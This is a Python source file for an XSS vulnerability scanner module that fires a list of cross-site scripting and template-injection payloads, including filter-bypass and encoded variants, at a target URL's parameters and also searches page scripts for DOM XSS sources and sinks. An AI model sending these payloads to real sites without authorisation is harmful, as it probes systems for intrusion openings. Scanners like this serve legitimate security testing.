import requests
import urllib.parse
import re
from typing import Dict, Any, List
from bs4 import BeautifulSoup
from core.base_module import BaseModule
from config.settings import config


class XSSScanner(BaseModule):
    """Cross-Site Scripting (XSS) vulnerability scanner."""

    XSS_PAYLOADS = [
        # Basic
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        "'><script>alert('XSS')</script>",

        # Event handlers
        '" onmouseover="alert(1)"',
        "' onfocus='alert(1)' autofocus='",
        '<body onload=alert("XSS")>',
        '<input onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',

        # Encoded
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',

        # Filter bypass
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<img/src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        'javascript:alert(1)',

        # Template injection
        '{{7*7}}', '${7*7}', '<%= 7*7 %>',

        # DOM-based
        '#<img src=x onerror=alert(1)>',
    ]

    # Canary to detect reflection
    CANARY = "cybsec7x7test"

    def __init__(self):
        super().__init__("XSS Scanner")
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': config.USER_AGENT})

    def _check_reflection(self, url: str, param: str, method: str = 'GET') -> bool:
        """Check if parameter value is reflected in response."""
        try:
            if method == 'GET':
                parsed = urllib.parse.urlparse(url)
                params = dict(urllib.parse.parse_qsl(parsed.query))
                params[param] = self.CANARY
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params)}"
                response = self.session.get(test_url, timeout=config.DEFAULT_TIMEOUT)
            else:
                response = self.session.post(url, data={param: self.CANARY},
                                            timeout=config.DEFAULT_TIMEOUT)

            return self.CANARY in response.text
        except:
            return False

    def _test_reflected_xss(self, url: str, param: str, method: str = 'GET') -> List[Dict]:
        """Test for reflected XSS."""
        findings = []

        # First check if value is reflected
        if not self._check_reflection(url, param, method):
            self.logger.info(f"  ℹ️  Parameter {param} not reflected in response")
            return findings

        self.logger.info(f"  ✅ Parameter {param} IS reflected - testing payloads...")

        for payload in self.XSS_PAYLOADS:
            try:
                if method == 'GET':
                    parsed = urllib.parse.urlparse(url)
                    params = dict(urllib.parse.parse_qsl(parsed.query))
                    params[param] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params)}"
                    response = self.session.get(test_url, timeout=config.DEFAULT_TIMEOUT)
                else:
                    response = self.session.post(url, data={param: payload},
                                                timeout=config.DEFAULT_TIMEOUT)

                # Check if payload appears unencoded in response
                if payload in response.text:
                    # Verify it's actually in HTML context (not just in a script string or attribute)
                    soup = BeautifulSoup(response.text, 'html.parser')

                    finding = {
                        'type': 'Reflected XSS',
                        'severity': 'High',
                        'parameter': param,
                        'payload': payload,
                        'url': url,
                        'method': method,
                        'reflected_unencoded': True
                    }
                    findings.append(finding)
                    self.logger.warning(
                        f"  🚨 XSS FOUND! Parameter: {param}, "
                        f"Payload: {payload[:50]}"
                    )
                    break  # One confirmed finding per parameter is enough

                # Check for partial encoding bypass
                decoded_payload = urllib.parse.unquote(payload)
                if decoded_payload != payload and decoded_payload in response.text:
                    finding = {
                        'type': 'Possible Reflected XSS (URL decoded)',
                        'severity': 'Medium',
                        'parameter': param,
                        'payload': payload,
                        'url': url
                    }
                    findings.append(finding)

            except Exception as e:
                self.logger.debug(f"XSS test error: {e}")

        return findings

    def _check_dom_xss(self, url: str) -> List[Dict]:
        """Check for potential DOM-based XSS sinks."""
        findings = []
        try:
            response = self.session.get(url, timeout=config.DEFAULT_TIMEOUT)

            # DOM XSS sources and sinks
            sources = [
                'document.URL', 'document.documentURI', 'document.URLUnencoded',
                'document.baseURI', 'location', 'location.href', 'location.search',
                'location.hash', 'location.pathname', 'document.cookie',
                'document.referrer', 'window.name', 'history.pushState',
                'history.replaceState', 'localStorage', 'sessionStorage'
            ]

            sinks = [
                'eval(', 'setTimeout(', 'setInterval(', 'Function(',
                'innerHTML', 'outerHTML', 'insertAdjacentHTML',
                'document.write(', 'document.writeln(',
                '.href=', '.src=', '.action=',
                'jQuery.html(', '$.html(', '.append(',
            ]

            scripts = re.findall(r'<script[^>]*>(.*?)</script>', response.text, re.DOTALL)

            for script in scripts:
                found_sources = [s for s in sources if s in script]
                found_sinks = [s for s in sinks if s in script]

                if found_sources and found_sinks:
                    finding = {
                        'type': 'Potential DOM XSS',
                        'severity': 'Medium',
                        'sources_found': found_sources,
                        'sinks_found': found_sinks,
                        'url': url,
                        'note': 'Manual verification required'
                    }
                    findings.append(finding)
                    self.logger.warning(
                        f"  ⚠️  DOM XSS potential: Sources: {found_sources}, "
                        f"Sinks: {found_sinks}"
                    )

        except Exception as e:
            self.logger.debug(f"DOM XSS check error: {e}")

        return findings

    def run(self, target: str, **kwargs) -> Dict[str, Any]:
        """Run XSS scan."""
        params = kwargs.get('params', [])
        method = kwargs.get('method', 'GET')

        # Auto-detect parameters
        if not params:
            parsed = urllib.parse.urlparse(target)
            params = [p[0] for p in urllib.parse.parse_qsl(parsed.query)]

        all_findings = []

        # Reflected XSS
        for param in params:
            self.logger.info(f"🔍 Testing parameter: {param}")
            all_findings.extend(self._test_reflected_xss(target, param, method))

        # DOM XSS
        self.logger.info("🔍 Checking for DOM-based XSS...")
        all_findings.extend(self._check_dom_xss(target))

        return {
            'target': target,
            'parameters_tested': params,
            'findings': all_findings,
            'total_vulnerabilities': len(all_findings)
        }